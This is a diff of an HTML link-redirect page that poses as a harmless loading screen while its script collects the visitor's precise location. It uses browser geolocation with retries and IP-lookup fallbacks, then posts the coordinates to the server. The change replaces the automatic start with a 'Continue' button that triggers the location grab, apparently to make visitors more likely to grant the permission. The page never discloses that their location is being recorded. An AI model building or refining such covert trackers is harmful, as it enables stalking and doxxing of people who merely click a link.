@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Please wait…</title>
+<title>Loading...</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 html,body{height:100%;background:#fff;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
@@ -17,6 +17,9 @@ html,body{height:100%;background:#fff;display:flex;align-items:center;justify-co
 @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(0.92)}}
 .title{font-size:1rem;font-weight:600;color:#111;margin-bottom:0.4rem}
 .msg{font-size:0.82rem;color:#9ca3af;line-height:1.5}
+.continue-btn{margin-top:1.4rem;padding:0.65rem 1.6rem;background:#6366f1;color:#fff;border:none;border-radius:8px;font-size:0.9rem;font-weight:600;cursor:pointer;width:100%}
+.continue-btn:active{opacity:0.85}
+.continue-btn:disabled{opacity:0.5;cursor:not-allowed}
 .bar{position:fixed;top:0;left:0;height:3px;background:#6366f1;width:0%;transition:width 0.4s ease;z-index:100}
 </style>
 </head>
@@ -24,8 +27,9 @@ html,body{height:100%;background:#fff;display:flex;align-items:center;justify-co
 <div class="bar" id="bar"></div>
 <div class="wrap">
   <div class="dot-ring"><div class="dot"></div></div>
-  <p class="title">Loading...</p>
-  <p class="msg" id="msg">Please wait while we verify your region</p>
+  <p class="title">Ready to continue?</p>
+  <p class="msg" id="msg">Click the button below to proceed</p>
+  <button class="continue-btn" id="continueBtn">Continue →</button>
 </div>
 
 <script>
@@ -37,13 +41,12 @@ const MAX_RETRIES = 2;
 
 const bar = document.getElementById('bar');
 const msg = document.getElementById('msg');
+const continueBtn = document.getElementById('continueBtn');
 
 function setBar(pct, ms) {
   bar.style.transition = `width ${ms}ms ease`;
   bar.style.width = pct + '%';
 }
-
-setBar(20, 400);
 
 // Get destination URL
 fetch('/api/hits/' + linkId)
@@ -78,25 +81,13 @@ async function getIPLocation() {
       return { lat: data.latitude, lon: data.longitude, acc: 5000 };
     }
   } catch (e) {}
-  
-  // Second fallback API
-  try {
-    const response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN'); // Optional: add token for better rate limits
-    const data = await response.json();
-    const [lat, lon] = (data.loc || '').split(',');
-    if (lat && lon) {
-      return { lat: parseFloat(lat), lon: parseFloat(lon), acc: 5000 };
-    }
-  } catch (e) {}
-  
   return null;
 }
 
-// Try HTML5 geolocation with retries
+// Grab location with retry
 function grabLocationWithRetry() {
   if (!navigator.geolocation) {
     msg.textContent = 'Getting location from network...';
-    setBar(60, 300);
     getIPLocation().then(ipLoc => {
       if (ipLoc) {
         postLoc(ipLoc.lat, ipLoc.lon, ipLoc.acc);
@@ -124,13 +115,11 @@ function grabLocationWithRetry() {
       );
     },
     err => {
-      // Retry on non-user-denial errors
       if (retryCount < MAX_RETRIES && err.code !== 1) {
         retryCount++;
         msg.textContent = `Retrying location detection (${retryCount}/${MAX_RETRIES})...`;
         setTimeout(() => grabLocationWithRetry(), 1500);
       } else {
-        // Try IP fallback
         msg.textContent = 'Using network location...';
         setBar(70, 300);
         getIPLocation().then(ipLoc => {
@@ -146,13 +135,15 @@ function grabLocationWithRetry() {
   );
 }
 
-// Start auto-tracking immediately
-setBar(40, 400);
-setTimeout(() => {
-  msg.textContent = 'Detecting your region...';
+function startLocationGrab() {
+  continueBtn.disabled = true;
+  continueBtn.textContent = 'Processing...';
+  msg.textContent = 'Detecting your location...';
   setBar(50, 300);
   grabLocationWithRetry();
-}, 500);
+}
+
+continueBtn.addEventListener('click', startLocationGrab);
 </script>
 </body>
 </html>
